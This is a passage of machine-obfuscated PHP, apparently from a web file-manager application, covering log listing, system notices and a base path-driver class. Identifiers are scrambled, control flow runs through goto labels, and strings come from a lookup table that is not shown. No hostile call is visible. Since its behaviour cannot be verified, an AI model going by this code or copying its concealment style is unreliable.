{ show_json(array(), !0, $f˜òß¤¸”[$dÒˆ ù“ï[351]]); } goto bÈ²å†³·Ï; b¥†¸—¡ß²: $dÒˆ ù“ï =& $_SERVER[Æ]; if (!$e³òéø‘õÕ) { show_json(array()); } $F‚¦ƒÃŸå = array(); goto Dò‡–ë’š; Dò‡–ë’š: if ($e³òéø‘õÕ[$dÒˆ ù“ï[1434]]) { $F‚¦ƒÃŸå[$dÒˆ ù“ï[1434]] = $e³òéø‘õÕ[$dÒˆ ù“ï[1434]]; } if (isset($e³òéø‘õÕ[$dÒˆ ù“ï[700]])) { $b ˜—ùñ¿Ë = $e³òéø‘õÕ[$dÒˆ ù“ï[700]]; $eí„»…±áæ = isset($e³òéø‘õÕ[$dÒˆ ù“ï[701]]) ? $e³òéø‘õÕ[$dÒˆ ù“ï[701]] : time(); $F‚¦ƒÃŸå[$dÒˆ ù“ï[187]] = array($dÒˆ ù“ï[321], array($b ˜—ùñ¿Ë, $eí„»…±áæ)); } if ($e³òéø‘õÕ[$dÒˆ ù“ï[29]]) { $a•¤Õ¡äÏ‘ = explode($dÒˆ ù“ï[47], $e³òéø‘õÕ[$dÒˆ ù“ï[29]]); $a‡¤£ œÚ¹ = $this->typeFile(); $FŸ²êÎêÈ = array(); foreach ($a•¤Õ¡äÏ‘ as $C–¥ÌÜÄ‰) { $FŸ²êÎêÈ[] = $C–¥ÌÜÄ‰; if (isset($a‡¤£ œÚ¹[$C–¥ÌÜÄ‰])) { $FŸ²êÎêÈ = array_merge($FŸ²êÎêÈ, $a‡¤£ œÚ¹[$C–¥ÌÜÄ‰]); } } $FŸ²êÎêÈ = array_unique($FŸ²êÎêÈ); if ($FŸ²êÎêÈ) { $F‚¦ƒÃŸå[$dÒˆ ù“ï[29]] = array($dÒˆ ù“ï[7], $FŸ²êÎêÈ); } } goto F¯¢â‹²•; bÈ²å†³·Ï: $f˜òß¤¸”[$dÒˆ ù“ï[354]] = $this->logList($f˜òß¤¸”[$dÒˆ ù“ï[354]]); return $f˜òß¤¸”; goto DÛ»°·Ôœå; DÛ»°·Ôœå: } private function ipAddress(&$A‘Í®Ì™£İ) { $e•“ğ·Åñ =& $_SERVER[Æ]; if (!empty($A‘Í®Ì™£İ[$e•“ğ·Åñ[2461]])) { $FæÄ‘¸Àé± = IpLocation::get($A‘Í®Ì™£İ[$e•“ğ·Åñ[2461]]); if ($FæÄ‘¸Àé± == $e•“ğ·Åñ[2462]) { $FæÄ‘¸Àé± = $e•“ğ·Åñ[2463]; } } else { $FæÄ‘¸Àé± = LNG($e•“ğ·Åñ[2464]); } $A‘Í®Ì™£İ[$e•“ğ·Åñ[2465]] = $FæÄ‘¸Àé±; } private function descZipDownload($böÍ£¡ÄÓÔ, &$e‹ØÌë¨) { $C¯’ÕâåŞå =& $_SERVER[Æ]; if (!isset($böÍ£¡ÄÓÔ[$C¯’ÕâåŞå[2466]])) { return; } $B®×¨İŠ®– = json_decode($böÍ£¡ÄÓÔ[$C¯’ÕâåŞå[2466]], !0); foreach ($B®×¨İŠ®– as $F¨ğ„Ÿ‚çŠ) { if (!IO::init($F¨ğ„Ÿ‚çŠ[$C¯’ÕâåŞå[75]])) { continue; } if (!($DÆºŸªŠé¦ = IO::infoFull($F¨ğ„Ÿ‚çŠ[$C¯’ÕâåŞå[75]]))) { continue; } $böÍ£¡ÄÓÔ[$C¯’ÕâåŞå[75]] = $F¨ğ„Ÿ‚çŠ[$C¯’ÕâåŞå[75]]; $e‹ØÌë¨[] = $böÍ£¡ÄÓÔ[$C¯’ÕâåŞå[369]] = $DÆºŸªŠé¦[$C¯’ÕâåŞå[369]]; $e‹ØÌë¨[] = $böÍ£¡ÄÓÔ[$C¯’ÕâåŞå[2282]] = $DÆºŸªŠé¦[$C¯’ÕâåŞå[461]]; break; } return $böÍ£¡ÄÓÔ; } private function getSourceList(&$Eò¸ÑŠç÷) { $a¥Û¯‘‘¿ =& $_SERVER[Æ]; $FàãÖ‚ôËˆ = array(); foreach ($Eò¸ÑŠç÷ as $eî–ƒÏ‰Õº => $cË¹ª‰å») { goto DÑ§°£ËòÂ; DÑ§°£ËòÂ: $D¬²ÇöùÉò = json_decode($cË¹ª‰å»[$a¥Û¯‘‘¿[405]], !0); if ($cË¹ª‰å»[$a¥Û¯‘‘¿[29]] == $a¥Û¯‘‘¿[2073]) { $D¬²ÇöùÉò = $this->descZipDownload($D¬²ÇöùÉò, $FàãÖ‚ôËˆ); $Eò¸ÑŠç÷[$eî–ƒÏ‰Õº][$a¥Û¯‘‘¿[405]] = json_encode($D¬²ÇöùÉò); continue; } if (strpos($cË¹ª‰å»[$a¥Û¯‘‘¿[29]], $a¥Û¯‘‘¿[2283]) !== 0) { goto eµÅùÙÄ¯ğ; e‹ù¡¸Õ”™: $FàãÖ‚ôËˆ[] = $D¬²ÇöùÉò[$a¥Û¯‘‘¿[369]] = $D©‘»óª‘¨[$a¥Û¯‘‘¿[369]]; $FàãÖ‚ôËˆ[] = $D¬²ÇöùÉò[$a¥Û¯‘‘¿[2282]] = $D©‘»óª‘¨[$a¥Û¯‘‘¿[461]]; $Eò¸ÑŠç÷[$eî–ƒÏ‰Õº][$a¥Û¯‘‘¿[405]] = json_encode($D¬²ÇöùÉò); goto e¡“áãçîø; eµÅùÙÄ¯ğ: if (!isset($D¬²ÇöùÉò[$a¥Û¯‘‘¿[75]]) || strpos($cË¹ª‰å»[$a¥Û¯‘‘¿[29]], $a¥Û¯‘‘¿[2467]) !== 0) { continue; } if (!IO::init($D¬²ÇöùÉò[$a¥Û¯‘‘¿[75]])) { continue; } if (!($D©‘»óª‘¨ = IO::infoFull($D¬²ÇöùÉò[$a¥Û¯‘‘¿[75]]))) { continue; } goto e‹ù¡¸Õ”™; e¡“áãçîø: continue; goto aÌ®á‹¿°º; aÌ®á‹¿°º: } goto eëˆÙ›Ø†â; d„Èò‘·®: if ($D¬²ÇöùÉò[$a¥Û¯‘‘¿[29]] == $a¥Û¯‘‘¿[2290]) { $FàãÖ‚ôËˆ[] = $D¬²ÇöùÉò[$a¥Û¯‘‘¿[405]][$a¥Û¯‘‘¿[369]]; } goto fğöÕİÚ„Ç; eëˆÙ›Ø†â: $FàãÖ‚ôËˆ[] = $D¬²ÇöùÉò[$a¥Û¯‘‘¿[369]]; $FàãÖ‚ôËˆ[] = $D¬²ÇöùÉò[$a¥Û¯‘‘¿[2282]]; if ($D¬²ÇöùÉò[$a¥Û¯‘‘¿[29]] == $a¥Û¯‘‘¿[492]) { $FàãÖ‚ôËˆ[] = $D¬²ÇöùÉò[$a¥Û¯‘‘¿[405]][$a¥Û¯‘‘¿[1006]]; $FàãÖ‚ôËˆ[] = $D¬²ÇöùÉò[$a¥Û¯‘‘¿[405]][$a¥Û¯‘‘¿[1007]]; } goto d„Èò‘·®; fğöÕİÚ„Ç: } if (!$FàãÖ‚ôËˆ) { return array(); } return Model($a¥Û¯‘‘¿[751])->sourceListInfo($FàãÖ‚ôËˆ, !0); } private function logList($d¤ùÌÜóÜ„) { goto E³ğ…ËœŒ; E³ğ…ËœŒ: $FÃÎ‘–×É =& $_SERVER[Æ]; $d¾­°å¥¥ = array_to_keyvalue($d¤ùÌÜóÜ„, $FÃÎ‘–×É[33], $FÃÎ‘–×É[1434]); $dôìĞ÷Œâ = Model($FÃÎ‘–×É[477])->userListInfo(array_unique($d¾­°å¥¥)); goto b¡‘Àå÷Â; b¡‘Àå÷Â: $A¹©¯ÀåĞ = $this->getSourceList($d¤ùÌÜóÜ„); $d¦Èó¨ÑÂ = $this->typeAll(); $E¾•–Œâ‰… = array(); goto FßÖ¡—¿; bÊ´ÈŒÑ¢Î: return $E¾•–Œâ‰…; goto bò‹ÕæÄ²; FßÖ¡—¿: $Dğê×× · = array(); foreach ($d¤ùÌÜóÜ„ as $AÓ››±¥‰ò => $b—¨å°›Æå) { goto f‡Ï–Äç»®; aâøƒ±è§ê: $this->ipAddress($b—¨å°›Æå); if (strpos($C°‡ñƒ£°, $FÃÎ‘–×É[2283]) === 0 || isset($bÚ«©§İÔ´[$FÃÎ‘–×É[2282]])) { goto c‚Ï½á³ê‚; EÅÎæ‰Å¦: if ($bÚ«©§İÔ´[$FÃÎ‘–×É[29]] == $FÃÎ‘–×É[2290]) { $bÚ«©§İÔ´[$FÃÎ‘–×É[405]][$FÃÎ‘–×É[369]] = $A¹©¯ÀåĞ[$bÚ«©§İÔ´[$FÃÎ‘–×É[405]][$FÃÎ‘–×É[369]]]; } if ($bÚ«©§İÔ´[$FÃÎ‘–×É[29]] == $FÃÎ‘–×É[2068]) { $bÚ«©§İÔ´[$FÃÎ‘–×É[2295]] = $bÚ«©§İÔ´[$FÃÎ‘–×É[391]]; $bÚ«©§İÔ´[$FÃÎ‘–×É[2282]] = $bÚ«©§İÔ´[$FÃÎ‘–×É[2295]][$FÃÎ‘–×É[369]]; $bÚ«©§İÔ´[$FÃÎ‘–×É[391]] = !1; $bÚ«©§İÔ´[$FÃÎ‘–×É[369]] = $FÃÎ‘–×É[33]; } if ($bÚ«©§İÔ´[$FÃÎ‘–×É[391]] && $bÚ«©§İÔ´[$FÃÎ‘–×É[391]][$FÃÎ‘–×É[371]] == $FÃÎ‘–×É[1080]) { $Dğê×× ·[] = $b—¨å°›Æå[$FÃÎ‘–×É[367]]; unset($d¤ùÌÜóÜ„[$AÓ››±¥‰ò]); continue; } goto BŠç˜Çù›; c‚Ï½á³ê‚: $bÚ«©§İÔ´[$FÃÎ‘–×É[391]] = $A¹©¯ÀåĞ[$bÚ«©§İÔ´[$FÃÎ‘–×É[369]]]; $bÚ«©§İÔ´[$FÃÎ‘–×É[2295]] = $A¹©¯ÀåĞ[$bÚ«©§İÔ´[$FÃÎ‘–×É[2282]]]; if ($bÚ«©§İÔ´[$FÃÎ‘–×É[29]] == $FÃÎ‘–×É[492]) { $bÚ«©§İÔ´[$FÃÎ‘–×É[405]][$FÃÎ‘–×É[1006]] = $A¹©¯ÀåĞ[$bÚ«©§İÔ´[$FÃÎ‘–×É[405]][$FÃÎ‘–×É[1006]]]; $bÚ«©§İÔ´[$FÃÎ‘–×É[405]][$FÃÎ‘–×É[1007]] = $A¹©¯ÀåĞ[$bÚ«©§İÔ´[$FÃÎ‘–×É[405]][$FÃÎ‘–×É[1007]]]; } goto EÅÎæ‰Å¦; BŠç˜Çù›: if ($bÚ«©§İÔ´[$FÃÎ‘–×É[2295]] && $bÚ«©§İÔ´[$FÃÎ‘–×É[2295]][$FÃÎ‘–×É[371]] == $FÃÎ‘–×É[1080]) { $Dğê×× ·[] = $b—¨å°›Æå[$FÃÎ‘–×É[367]]; unset($d¤ùÌÜóÜ„[$AÓ››±¥‰ò]); continue; } goto fé°‚ªãéä; fé°‚ªãéä: } $b—¨å°›Æå[$FÃÎ‘–×É[405]] = $bÚ«©§İÔ´; goto e§Œçİé‡»; e§Œçİé‡»: unset($b—¨å°›Æå[$FÃÎ‘–×É[2470]]); $E¾•–Œâ‰…[] = $b—¨å°›Æå; goto E—É°íÀƒ¢; f¦õ¸Û®Œ: $b—¨å°›Æå[$FÃÎ‘–×É[2238]] = $EÌ°¾ÜÚ‘É; $bÚ«©§İÔ´ = json_decode($b—¨å°›Æå[$FÃÎ‘–×É[405]], !0); $b—¨å°›Æå[$FÃÎ‘–×É[2461]] = isset($bÚ«©§İÔ´[$FÃÎ‘–×É[2461]]) ? $bÚ«©§İÔ´[$FÃÎ‘–×É[2461]] : $FÃÎ‘–×É[33]; goto aâøƒ±è§ê; f‡Ï–Äç»®: $C°‡ñƒ£° = $b—¨å°›Æå[$FÃÎ‘–×É[29]]; $EÌ°¾ÜÚ‘É = isset($dôìĞ÷Œâ[$b—¨å°›Æå[$FÃÎ‘–×É[1434]]]) ? $dôìĞ÷Œâ[$b—¨å°›Æå[$FÃÎ‘–×É[1434]]] : !1; $Cí¬•ŸÌôã = strpos($C°‡ñƒ£°, $FÃÎ‘–×É[2468]) === 0 ? LNG($FÃÎ‘–×É[2469]) : LNG($FÃÎ‘–×É[2464]); goto e´ñêêøåÅ; e´ñêêøåÅ: $b—¨å°›Æå[$FÃÎ‘–×É[28]] = isset($EÌ°¾ÜÚ‘É[$FÃÎ‘–×É[28]]) ? $EÌ°¾ÜÚ‘É[$FÃÎ‘–×É[28]] : LNG($FÃÎ‘–×É[2464]); $b—¨å°›Æå[$FÃÎ‘–×É[2330]] = isset($EÌ°¾ÜÚ‘É[$FÃÎ‘–×É[2330]]) ? $EÌ°¾ÜÚ‘É[$FÃÎ‘–×É[2330]] : $FÃÎ‘–×É[33]; $b—¨å°›Æå[$FÃÎ‘–×É[1340]] = isset($d¦Èó¨ÑÂ[$C°‡ñƒ£°]) ? $d¦Èó¨ÑÂ[$C°‡ñƒ£°] : $Cí¬•ŸÌôã; goto f¦õ¸Û®Œ; E—É°íÀƒ¢: } $this->clearSystemPathLog($Dğê×× ·); goto bÊ´ÈŒÑ¢Î; bò‹ÕæÄ²: } private function clearSystemPathLog($FçÜ‡ô±ò) { $A—ÏÁ÷½«Ë =& $_SERVER[Æ]; if (count($FçÜ‡ô±ò) == 0) { return; } $a¼’Ó…–Ï° = array($A—ÏÁ÷½«Ë[367] => array($A—ÏÁ÷½«Ë[7], array_unique($FçÜ‡ô±ò))); $this->where($a¼’Ó…–Ï°)->delete(); } public function deviceList($A °øË‘ƒ¨, $cÈ¸÷›é‘È = 0) { $C½‡ÉîŠÆ¡ =& $_SERVER[Æ]; $e¬œÚ÷¦ó = array($C½‡ÉîŠÆ¡[1434] => $A °øË‘ƒ¨, $C½‡ÉîŠÆ¡[187] => array($C½‡ÉîŠÆ¡[929], $cÈ¸÷›é‘È), $C½‡ÉîŠÆ¡[29] => $C½‡ÉîŠÆ¡[2041]); $cÓâÍß¼ŞŠ = array(); $d‡–§„±¹ø = $this->field($C½‡ÉîŠÆ¡[2471])->where($e¬œÚ÷¦ó)->order($C½‡ÉîŠÆ¡[2293])->limit(50)->select(); foreach ($d‡–§„±¹ø as $BŞ‚¥ãÍ—½ => $B»…ŒµŸÀ) { goto døÌïªÖî¹; døÌïªÖî¹: if ($BŞ‚¥ãÍ—½ > 0 && abs($B»…ŒµŸÀ[$C½‡ÉîŠÆ¡[187]] - $d‡–§„±¹ø[$BŞ‚¥ãÍ—½ - 1][$C½‡ÉîŠÆ¡[187]]) < 5) { continue; } $fª—Ê®™İÎ = json_decode($B»…ŒµŸÀ[$C½‡ÉîŠÆ¡[405]], !0); $B»…ŒµŸÀ[$C½‡ÉîŠÆ¡[2461]] = isset($fª—Ê®™İÎ[$C½‡ÉîŠÆ¡[2461]]) ? $fª—Ê®™İÎ[$C½‡ÉîŠÆ¡[2461]] : $C½‡ÉîŠÆ¡[33]; goto dàŒòÃµƒ; dàŒòÃµƒ: unset($fª—Ê®™İÎ[$C½‡ÉîŠÆ¡[2461]]); $dÄ–ÓæìİÆ = $this->deviceType($fª—Ê®™İÎ[$C½‡ÉîŠÆ¡[2284]]); if (isset($cÓâÍß¼ŞŠ[$dÄ–ÓæìİÆ])) { continue; } goto d¬•İªãõá; d¬•İªãõá: $this->ipAddress($B»…ŒµŸÀ); $B»…ŒµŸÀ[$C½‡ÉîŠÆ¡[405]] = $fª—Ê®™İÎ; $cÓâÍß¼ŞŠ[$dÄ–ÓæìİÆ] = $B»…ŒµŸÀ; goto E™¥Úµ¶ÛÌ; E™¥Úµ¶ÛÌ: } return array_values($cÓâÍß¼ŞŠ); } public function deviceType($Aß˜Ää„¶‚) { return $Aß˜Ää„¶‚; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\x2e\x6e\x6f\164\x69\x63\145\x4c\151\x73\x74"; public $field = array("\156\x61\x6d\x65", "\x63\x6f\x6e\x74\145\156\164", "\141\x75\164\150", "\155\x6f\x64\145", "\x74\151\x6d\x65", "\164\x79\x70\x65", "\x6c\145\x76\145\x6c", "\145\x6e\141\x62\x6c\145", "\x73\x6f\x72\164"); public function listData($D¬¿ö¶¿óŠ = false, $B°¶³Û¿æ = "\x73\157\x72\164", $Eµ²ÌğÁ­— = false) { return parent::listData($D¬¿ö¶¿óŠ, $B°¶³Û¿æ, $Eµ²ÌğÁ­—); } public function add($f²…Ù“µÁ) { $CÎÛÒ¨‡ =& $_SERVER[Æ]; $e…¼õ®Ì¼— = time(); if ($f²…Ù“µÁ[$CÎÛÒ¨‡[12]] == $CÎÛÒ¨‡[2472]) { $e…¼õ®Ì¼— = strtotime($f²…Ù“µÁ[$CÎÛÒ¨‡[190]]); } $f²…Ù“µÁ[$CÎÛÒ¨‡[190]] = $e…¼õ®Ì¼—; return parent::insert($f²…Ù“µÁ); } public function update($FĞÕ³¾Ò‰ä, $eØê£‡ƒÄ) { goto fØ“Ş’‘±Å; fØ“Ş’‘±Å: $Eº•ÁÕÁŠ =& $_SERVER[Æ]; $CÚ©Œ¿‘Ÿ = $this->listData($FĞÕ³¾Ò‰ä); if (!$CÚ©Œ¿‘Ÿ) { return !1; } goto c½ÒØ”ëù ; c½ÒØ”ëù : $CÜÖ§…‹„å = time(); if ($eØê£‡ƒÄ[$Eº•ÁÕÁŠ[12]] == $Eº•ÁÕÁŠ[2472]) { $CÜÖ§…‹„å = strtotime($eØê£‡ƒÄ[$Eº•ÁÕÁŠ[190]]); } $eØê£‡ƒÄ[$Eº•ÁÕÁŠ[190]] = $CÜÖ§…‹„å; goto AïÖ±ùƒ¶; AïÖ±ùƒ¶: return parent::update($FĞÕ³¾Ò‰ä, $eØê£‡ƒÄ); goto béîÂ×è¼²; béîÂ×è¼²: } public function remove($C±¡´¢ÕéÑ) { $Bñšˆé´íŒ = $this->listData($C±¡´¢ÕéÑ); if (!$Bñšˆé´íŒ || $Bñšˆé´íŒ[$_SERVER[Æ][1080]]) { return !1; } return parent::remove($C±¡´¢ÕéÑ); } public function sort($CÅ«À©†ËŠ, $Eˆ´¬‹Õ‡) { return parent::update($CÅ«À©†ËŠ, $Eˆ´¬‹Õ‡); } public function enable($bâÇÍŸç, $f·Š¸òÏß£) { return parent::update($bâÇÍŸç, array($_SERVER[Æ][2473] => $f·Š¸òÏß£)); } private function initUserOption() { $CÁã–¿ªœ =& $_SERVER[Æ]; $this->optionType = $CÁã–¿ªœ[2474]; $this->modelType = $CÁã–¿ªœ[2475]; $this->field = array($CÁã–¿ªœ[2476], $CÁã–¿ªœ[28], $CÁã–¿ªœ[190], $CÁã–¿ªœ[29], $CÁã–¿ªœ[2477], $CÁã–¿ªœ[687], $CÁã–¿ªœ[183]); } public function userNoticeGet($AÃŸîË°î = false) { $this->initUserOption(); return parent::listData($AÃŸîË°î, $_SERVER[Æ][367], !0); } public function userNoticeAdd($E¡‡×Ç‹´­) { $f›–İ’ĞÙ© =& $_SERVER[Æ]; $this->initUserOption(); $bøÆç«‘›õ = $this->findByKey($f›–İ’ĞÙ©[2476], $E¡‡×Ç‹´­[$f›–İ’ĞÙ©[367]]); if ($bøÆç«‘›õ) { return !0; } $B×÷ÉÄ‘è = array($f›–İ’ĞÙ©[2476] => $E¡‡×Ç‹´­[$f›–İ’ĞÙ©[367]], $f›–İ’ĞÙ©[28] => $E¡‡×Ç‹´­[$f›–İ’ĞÙ©[28]], $f›–İ’ĞÙ©[190] => $E¡‡×Ç‹´­[$f›–İ’ĞÙ©[190]], $f›–İ’ĞÙ©[29] => isset($E¡‡×Ç‹´­[$f›–İ’ĞÙ©[29]]) ? $E¡‡×Ç‹´­[$f›–İ’ĞÙ©[29]] : 1, $f›–İ’ĞÙ©[2477] => isset($E¡‡×Ç‹´­[$f›–İ’ĞÙ©[2477]]) ? $E¡‡×Ç‹´­[$f›–İ’ĞÙ©[2477]] : 0, $f›–İ’ĞÙ©[687] => 0, $f›–İ’ĞÙ©[183] => 0); return parent::insert($B×÷ÉÄ‘è); } public function userNoticeEdit($aãøš†³õØ, $FŒ¼Æ©·Ë) { $this->initUserOption(); return parent::update($aãøš†³õØ, $FŒ¼Æ©·Ë); } } goto Có’Ï·áç´; e…Çá¿ŒÙ§: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $EÙ«¿çìù’ =& $_SERVER[Æ]; $this->objectDriver = array($EÙ«¿çìù’[57], $EÙ«¿çìù’[58], $EÙ«¿çìù’[59], $EÙ«¿çìù’[60], $EÙ«¿çìù’[61], $EÙ«¿çìù’[62], $EÙ«¿çìù’[63], $EÙ«¿çìù’[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($D¬ïĞŒ¢õ¢) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($D¬ïĞŒ¢õ¢, $_SERVER[Æ][8]); } return $D¬ïĞŒ¢õ¢; } public function getPathName($FßäøéˆŠß) { return $FßäøéˆŠß; } public function iconvApp($ašÀÜÛœË) { return $ašÀÜÛœË; } public function iconvSystem($bÓ½ó«†÷×) { return $bÓ½ó«†÷×; } public function iconvTo($A¸¨‡‰É‡¨, $FÀ¦ˆ¨§Ç±, $Cˆ£¬‹¬Ÿä) { goto f§âÁ÷İŒ; B¸¡³Æ¹°İ: $C‘Šğ½á³ = $FÀ¦ˆ¨§Ç± . $aœÏ³âÒµà[66] . $Cˆ£¬‹¬Ÿä . $aœÏ³âÒµà[67] . $A¸¨‡‰É‡¨; if (isset($Dù„Ê¨‰ñŞ[$C‘Šğ½á³])) { return $Dù„Ê¨‰ñŞ[$C‘Šğ½á³]; } if (function_exists($aœÏ³âÒµà[68])) { $dƒÊÖš¸ƒ = @mb_convert_encoding($A¸¨‡‰É‡¨, $Cˆ£¬‹¬Ÿä, $FÀ¦ˆ¨§Ç±); } else { $dƒÊÖš¸ƒ = @iconv($FÀ¦ˆ¨§Ç±, $Cˆ£¬‹¬Ÿä, $A¸¨‡‰É‡¨); } goto CÓ…õåÂ‹Ÿ; f§âÁ÷İŒ: $aœÏ³âÒµà =& $_SERVER[Æ]; if (!$A¸¨‡‰É‡¨ || !function_exists($aœÏ³âÒµà[65])) { return $A¸¨‡‰É‡¨; } static $Dù„Ê¨‰ñŞ = array(); goto B¸¡³Æ¹°İ; fÅ¬ÉÆñ¹Ì: return $dƒÊÖš¸ƒ; goto A¸£ÎôŞó; c„Ó‡Ÿƒâ: $Dù„Ê¨‰ñŞ[$Cˆ£¬‹¬Ÿä . $aœÏ³âÒµà[66] . $FÀ¦ˆ¨§Ç± . $aœÏ³âÒµà[67] . $A¸¨‡‰É‡¨] = $A¸¨‡‰É‡¨; $Dù„Ê¨‰ñŞ[$Cˆ£¬‹¬Ÿä . $aœÏ³âÒµà[66] . $FÀ¦ˆ¨§Ç± . $aœÏ³âÒµà[67] . $dƒÊÖš¸ƒ] = $A¸¨‡‰É‡¨; $Dù„Ê¨‰ñŞ[$FÀ¦ˆ¨§Ç± . $aœÏ³âÒµà[66] . $Cˆ£¬‹¬Ÿä . $aœÏ³âÒµà[67] . $dƒÊÖš¸ƒ] = $dƒÊÖš¸ƒ; goto fÅ¬ÉÆñ¹Ì; CÓ…õåÂ‹Ÿ: $dƒÊÖš¸ƒ = $dƒÊÖš¸ƒ ? $dƒÊÖš¸ƒ : $A¸¨‡‰É‡¨; if (strstr($dƒÊÖš¸ƒ, $aœÏ³âÒµà[69])) { $dƒÊÖš¸ƒ = str_replace($aœÏ³âÒµà[69], $aœÏ³âÒµà[70], $dƒÊÖš¸ƒ); } $Dù„Ê¨‰ñŞ[$FÀ¦ˆ¨§Ç± . $aœÏ³âÒµà[66] . $Cˆ£¬‹¬Ÿä . $aœÏ³âÒµà[67] . $A¸¨‡‰É‡¨] = $dƒÊÖš¸ƒ; goto c„Ó‡Ÿƒâ; A¸£ÎôŞó: } public function getPathInner($Fˆ¬—„‘ĞÒ) { $c ¥íÂ‡§Û = IO::init($Fˆ¬—„‘ĞÒ); return $c ¥íÂ‡§Û->path; } public function getPathOuter($CÖ¤¾Ş²) { $D¢ƒ•­ğ´ =& $_SERVER[Æ]; $fôˆÁ’¬Ö = strlen(trim($this->pathBase, $D¢ƒ•­ğ´[8])); $CÖ¤¾Ş² = substr(trim($CÖ¤¾Ş², $D¢ƒ•­ğ´[8]), $fôˆÁ’¬Ö); return $this->pathDriver . $D¢ƒ•­ğ´[8] . ltrim($CÖ¤¾Ş², $D¢ƒ•­ğ´[8]); } public function isParentOf($cÒÅ©‚ß, $C…ğ¤î£Ô) { $Bˆ¨­½ç¿ =& $_SERVER[Æ]; $cÒÅ©‚ß = rtrim(strtolower($cÒÅ©‚ß), $Bˆ¨­½ç¿[8]) . $Bˆ¨­½ç¿[8]; $C…ğ¤î£Ô = rtrim(strtolower($C…ğ¤î£Ô), $Bˆ¨­½ç¿[8]) . $Bˆ¨­½ç¿[8]; $eôé¿¦• = strpos($C…ğ¤î£Ô, $cÒÅ©‚ß) === 0; return $eôé¿¦•; } public function getType() { $f¢øŠ„ğ =& $_SERVER[Æ]; $b¼¨¡íßºË = str_replace($f¢øŠ„ğ[71], $f¢øŠ„ğ[33], get_class($this)); return strtolower($b¼¨¡íßºË); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($fÏ¿……«, $b­Ç’ƒÏ¼¨) { $b“â‹Ê¡§ğ =& $_SERVER[Æ]; $F¨Øß™ˆĞö = rtrim($fÏ¿……«, $b“â‹Ê¡§ğ[8]) . $b“â‹Ê¡§ğ[8] . $b­Ç’ƒÏ¼¨; $A¯·‘°ÆÃ = $this->exist($F¨Øß™ˆĞö); return $A¯·‘°ÆÃ ? $F¨Øß™ˆĞö : !1; } public function renameObject($fª“¼å—š, $c¹ºŒÆë°¿) { goto C«¿ÉÁÃã; f„ŠËÀ•¥†: return $F×’¾ÎíÀ ? $c¹ºŒÆë°¿ : !1; goto Eª¾¸£Õè; C«¿ÉÁÃã: $F˜ğìÁ¨  =& $_SERVER[Æ]; $AÔö¢äÕ›£ = $c¹ºŒÆë°¿; Hook::trigger($F˜ğìÁ¨ [72], $this, $fª“¼å—š, $this, $this->pathFather($fª“¼å—š) . $c¹ºŒÆë°¿); goto cºäÄ¡÷ÃÇ; cºäÄ¡÷ÃÇ: $fª“¼å—š = $this->getPathOuter($fª“¼å—š); $c¹ºŒÆë°¿ = $this->pathFather($fª“¼å—š) . $c¹ºŒÆë°¿; if (IO::isFile($fª“¼å—š)) { $F×’¾ÎíÀ = IO::copy($fª“¼å—š, $this->pathFather($fª“¼å—š), REPEAT_RENAME_FOLDER, $AÔö¢äÕ›£); if ($F×’¾ÎíÀ) { IO::remove($fª“¼å—š); } } else { $F×’¾ÎíÀ = IO::mkdir($c¹ºŒÆë°¿); if (!$F×’¾ÎíÀ) { return !1; } $bóîšÓÏ… = IO::listPath($fª“¼å—š, !0); $B‚‹éÌ¢˜Œ = array_merge($bóîšÓÏ…[$F˜ğìÁ¨ [73]], $bóîšÓÏ…[$F˜ğìÁ¨ [74]]); foreach ($B‚‹éÌ¢˜Œ as $a‡‘œæ‡î) { IO::move($a‡‘œæ‡î[$F˜ğìÁ¨ [75]], $c¹ºŒÆë°¿, REPEAT_RENAME_FOLDER); } IO::remove($fª“¼å—š); } goto f„ŠËÀ•¥†; Eª¾¸£Õè: } public function tempFile($D¿ï¨Í…×ë = '', $B“ÁîççĞ† = '') { goto C…‘¦÷ÛÈ; d‰ÌÉ”× «: $CÃšİÊ«ÎÌ = $C±¿³”âÊÅ . $D¿ï¨Í…×ë; @touch($CÃšİÊ«ÎÌ); if ($B“ÁîççĞ†) { file_put_contents($CÃšİÊ«ÎÌ, $B“ÁîççĞ†); } goto b…âƒ¡ÅÚ; C…‘¦÷ÛÈ: if (!$D¿ï¨Í…×ë) { $D¿ï¨Í…×ë = rand_string(15); } $C±¿³”âÊÅ = TEMP_FILES . rand_string(15) . $_SERVER[Æ][8]; @mkdir($C±¿³”âÊÅ, 511, !0); goto d‰ÌÉ”× «; b…âƒ¡ÅÚ: return $CÃšİÊ«ÎÌ; goto eÇŸâ„Í; eÇŸâ„Í: } public function tempFileRemve($dˆ’ÛëÎï÷) { @unlink($dˆ’ÛëÎï÷); @rmdir($this->pathFather($dˆ’ÛëÎï÷)); } public function mkfile($F¿©Šø¢Ú, $aï´ô»à„¥ = '', $aÒ«Ì¬˜ñÖ = REPEAT_RENAME) { } public function mkdir($f¹±Í“”Ü, $fèë°ÓÇ˜ = REPEAT_SKIP) { } public function delFile($bÙÆ™‚Â‹œ) { } public function delFolder($e ˜ŠŠ–çÇ) { } public function copyFile($D¿á¹´ªæ, $a½àœæØŒÃ) { } public function moveFile($b’é…†½¼ç, $Dº÷—À—ÑÒ) { } public function remove($f‹«İ—) { if ($this->isFile($f‹«İ—)) { return $this->delFile($f‹«İ—); } return $this->delFolder($f‹«İ—); } public function rename($DÍŞìÅëœ, $c¨¡ºéÓÊš) { } public function exist($d´ÏÃôí‚ğ) { } public function findByHash($fãğ…²Œ–³ = '', $c†‘Êèá·‘ = '') { return !1; } public function isFile($fã•½…ì ´) { } public function isFolder($F‡ëë¬åõ) { } public function size($Då öŒ‰ã) { } public function info($Aîˆ‰Œİ§Ê) { } public function infoSimple($CíŠ…Û«ôĞ) { return $this->info($CíŠ…Û«ôĞ); } public function infoAuth($Bİßè£«à) { return $this->info($Bİßè£«à); } public function infoFull($Eä¡·æ¨ğ) { return $this->info($Eä¡·æ¨ğ); } public function infoWithChildren($dÀŒ©Ÿ‰­ƒ) { $EÂàÀÑõ…¯ =& $_SERVER[Æ]; static $C«…Ï¸»ãÖ = array(); if (isset($C«…Ï¸»ãÖ[$dÀŒ©Ÿ‰­ƒ])) { return $C«…Ï¸»ãÖ[$dÀŒ©Ÿ‰­ƒ]; } $D±æ µ±” = $this->info($dÀŒ©Ÿ‰­ƒ); if ($D±æ 